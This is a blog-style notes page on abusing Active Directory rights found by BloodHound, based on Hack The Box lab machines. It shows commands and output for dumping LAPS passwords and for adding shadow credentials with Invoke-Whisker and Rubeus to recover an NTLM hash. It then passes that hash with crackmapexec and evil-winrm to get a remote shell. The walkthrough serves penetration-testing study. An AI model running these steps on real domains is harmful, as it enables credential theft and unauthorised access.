---
description: >-
  BloodHound Vector Attacks
title: BloodHound Vector Attacks              # Add title here
date: 2023-05-28 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Privilege Escalation]                     # Change Templates to Writeup
tags: [active directory, windows privesc, bloodhound]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### ReadLAPSPassword
We can use the utility laps.py to read LAPS passwords:
```bash
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
LAPS Dumper - Running at 07-07-2022 13:57:05
DC &V@%DQ-wEwQ97A
```
[[StreamIO#^2cc182]]

### AddKeyCredentialLink
We can use `Invoke-Whisker.ps1` to abuse this privilege, first we need to execute the following command after upload it to the victim machine. This will retrieve a huge command that can be used with [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries):
```powershell
PS C:\Windows\Temp\Recon> Invoke-Whisker -Command "add /target:sflowers"
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password lAfNxND7rgF9A5mJ
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 86d8f569-2258-4ab5-8ce1-0c8befa21b55
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:sflowers 
/certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhY...
vXgICB9A= /password:"lAfNxND7rgF9A5mJ" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```
But first we need to delete the carrier return and jump line of every line on it, so we can use "tr" and "sponge" commands after saving the output on a file called data:
```bash
cat data | tr -d '\n' | sponge data
```
Finally we need to upload the Rubeus.exe with curl and execute it as indicated by `Invoke-Whisker`:
```powershell

 ______        _
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
...
  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  1/25/2023 7:28:01 AM
  EndTime                  :  1/25/2023 5:28:01 PM
  RenewTill                :  2/1/2023 7:28:01 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  8hh6He6G6F2lLiBgwgmo3w==
  ASREP (key)              :  EB63CD6F931B4E922AC0EC5439D0C716

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```
This will retrieve the NTLM hash of the user sflowers, which then can be checked with crackmapexec:
```bash
crackmapexec winrm 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5' 
SMB         10.10.11.175    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:outdated.htb)
HTTP        10.10.11.175    5985   DC               [*] http://10.10.11.175:5985/wsman
WINRM       10.10.11.175    5985   DC               [+] outdated.htb\sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5 (Pwn3d!)
```
The [+] and the (Pwned!) indicates that it is possible to login via winrm so let's do it:
```powershell
evil-winrm -i 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'         

*Evil-WinRM* PS C:\Users\sflowers\Documents>
```
Examples:
[Outdated](https://shuciran.github.io/posts/Outdated/#fnref:addkeycredentialink)